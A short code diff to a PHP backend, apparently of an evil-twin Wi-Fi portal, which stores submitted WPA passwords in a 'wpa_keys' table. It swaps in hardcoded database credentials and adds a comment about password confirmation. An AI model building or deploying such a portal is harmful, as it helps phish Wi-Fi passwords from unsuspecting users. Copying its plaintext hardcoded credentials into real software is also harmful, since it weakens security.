@@ -5,8 +5,8 @@ ob_start();
 //Database Connection Setup!
 
 $host="localhost";
-$username="root";
-$pass="";
+$username="dodgers"; //root on windows
+$pass="duck"; // "" on windows
 $dbname="eviltwin";
 $tbl_name="wpa_keys";
 
@@ -18,6 +18,7 @@ if (!$conn) {
 }
 
 // Post Request Coming from the user
+//The front end will not let the user to enter different passwords
 $password1=$_POST['password1'];
 $password2=$_POST['password2'];
 
